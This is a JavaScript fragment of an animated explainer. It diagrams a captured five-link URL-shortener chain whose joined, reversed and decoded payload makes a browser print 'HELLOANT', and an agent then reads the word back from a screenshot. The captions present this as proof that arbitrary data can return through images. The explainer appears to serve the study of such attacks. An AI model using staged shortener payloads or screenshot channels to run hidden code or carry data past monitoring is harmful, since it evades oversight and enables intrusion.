  s += G(T(480,510,`chain ${D.chain.head} · layer ${D.chain.layer_id} · sha256 ${D.chain.payload_sha256.slice(0,24)}…`,{anchor:'middle',size:12,mono:true,fill:COL.mute}),{op:win(p,.75,1)});
  return {svg:s, cap:'We do not have the request that started this chain, nor a matching output image.'};
};


// the benign first test: captured 5-link chain [SHORTENER CODE 225497], which just prints HELLOANT
SCENES.hello = p => {
  let s = '';
  const TD = D.test, a = win(p,0,.3), b = win(p,.3,.55), c = win(p,.55,.8), d = win(p,.8,1);
  s += T(480,44,'first, a harmless test: make the borrowed browser print a word',{anchor:'middle',size:15,bold:true});
  TD.hops.forEach((h,i)=>{ const x = 90+i*180, lab = ['entry','bootstrap','fragment 1','fragment 2','terminal'][i];
    if (i>0) s += ARROW(x-128+52,100,x-52,100,{t:clamp(a*6-i),stroke:COL.gray});
    s += G(R(x-52,80,104,42,{fill:COL.box,stroke:i===4?COL.red:COL.yellow,rx:6}) + T(x,97,h.code,{anchor:'middle',size:13,mono:true,bold:true}) + T(x,113,lab,{anchor:'middle',size:10,fill:COL.mute}),{op:clamp(a*6-i+0.5)}); });
  s += G(T(90,160,'joined buffer, reversed and decoded:',{size:12,fill:COL.mute}) + CODE(90,184,[TD.payload.trim()],{size:13.5,fill:COL.blue}),{op:b});
  // browser window showing HELLOANT
  s += G(R(260,230,440,230,{fill:COL.page,stroke:COL.blue,sw:2,rx:8}) + R(260,230,440,28,{fill:COL.chrome,rx:8}) + T(280,249,'[SHORTENER-1-HOST]'+TD.head,{size:12,mono:true,fill:COL.mute}) +
    T(480,360,'HELLOANT',{anchor:'middle',size:44,mono:true,fill:COL.pageInk,bold:true,op:c}),{op:c});
  s += G(ARROW(720,345,860,345,{t:d,stroke:COL.green}) + T(790,330,'screenshot',{anchor:'middle',size:11,fill:COL.mute}) + actorAgent(900,345,{hl:true,sub:'reads the word'}),{op:d});
  s += G(T(480,510,'If a word can come back in a picture, so can anything else.',{anchor:'middle',size:16,bold:true}),{op:d});
  return {svg:s, cap:'Captured 5-link chain [SHORTENER CODE 225497]: the recovered program only prints HELLOANT. Output image not captured.'};
};
